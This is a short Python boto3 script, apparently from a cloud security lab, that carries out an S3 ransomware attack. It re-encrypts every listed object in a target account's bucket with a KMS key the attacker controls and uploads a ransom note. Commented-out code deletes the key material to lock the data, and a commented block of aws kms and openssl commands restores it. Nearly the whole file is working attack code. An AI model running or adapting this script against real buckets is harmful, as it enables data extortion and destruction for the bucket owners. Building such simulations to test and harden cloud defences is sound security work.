#!/usr/bin/env python3

import boto3

##################################################
################################################## Config ##################################################
##################################################
aws_attacker_cli_profile = 'dev-test'
aws_attacker_account = '997124715511'
aws_target_cli_profile = 'target'  # The AWS CLI profile to use for the attack
bucket_name = 'attacksurface-target-s3-bucket-gpt7gm3l'  # The S3 bucket to target with the attack
key_id = '10d590ca-869e-47fd-a1cf-6e27c4628318'
kms_key_arn = f'arn:aws:kms:us-east-1:{aws_attacker_account}:key/{key_id}' 
##################################################

# to test encrypted file try to read with target account user
# aws s3 cp s3://proservlab-s3-bucket-to-target/file_uploaded_by_boto3.txt -

session = boto3.Session(profile_name=aws_target_cli_profile)

client = session.client('s3')
objects = client.list_objects_v2(Bucket=bucket_name, MaxKeys=100)['Contents']

s3 = session.resource('s3')
for obj in objects:
    s3.meta.client.copy({'Bucket': bucket_name, 'Key': obj['Key']}, bucket_name, f"{obj['Key']}", ExtraArgs={'ServerSideEncryption': 'aws:kms', 'SSEKMSKeyId': kms_key_arn})
print(f'Complete! Encrypted {len(objects)} objects!')

txt_data = b'---------------------------------\nYOUR FILES HAVE BEEN ENCRYPTED\n---------------------------------'
object = s3.Object(bucket_name, 'ransom-note.txt')
result = object.put(Body=txt_data)
print(f'Uploaded ransom-note.txt')

# switch context back to kms hosting session
# session = boto3.Session(profile_name=aws_attacker_cli_profile)
# client = boto3.client('kms')
# response = client.delete_imported_key_material(
#     KeyId=key_id
# )

##################################################
# restore key material
##################################################
# # generate import params
# export KEY=`aws kms --profile=dev-test --region us-east-1 get-parameters-for-import --key-id ${KEY_ID} --wrapping-algorithm RSAES_OAEP_SHA_256 --wrapping-key-spec RSA_2048 --query '{Key:PublicKey,Token:ImportToken}' --output text`
# echo "Key Import Params: ${KEY}"

# # create base64 publickey and token
# echo $KEY | awk '{print $1}' > PublicKey.b64
# echo $KEY | awk '{print $2}' > ImportToken.b64

# # create binary publickey and token
# openssl enc -d -base64 -A -in PublicKey.b64 -out PublicKey.bin
# openssl enc -d -base64 -A -in ImportToken.b64 -out ImportToken.bin

# # created encrypted key material
# openssl pkeyutl \
#     -in PlaintextKeyMaterial.bin \
#     -out EncryptedKeyMaterial.bin \
#     -inkey PublicKey.bin \
#     -keyform DER \
#     -pubin \
#     -encrypt \
#     -pkeyopt \
#     rsa_padding_mode:oaep \
#     -pkeyopt rsa_oaep_md:sha256

# # import encrypted key material
# aws kms --profile=dev-test \
#     --region us-east-1 \
#     import-key-material \
#     --key-id ${KEY_ID} \
#     --encrypted-key-material \
#     fileb://EncryptedKeyMaterial.bin \
#     --import-token fileb://ImportToken.bin \
#     --expiration-model KEY_MATERIAL_DOES_NOT_EXPIRE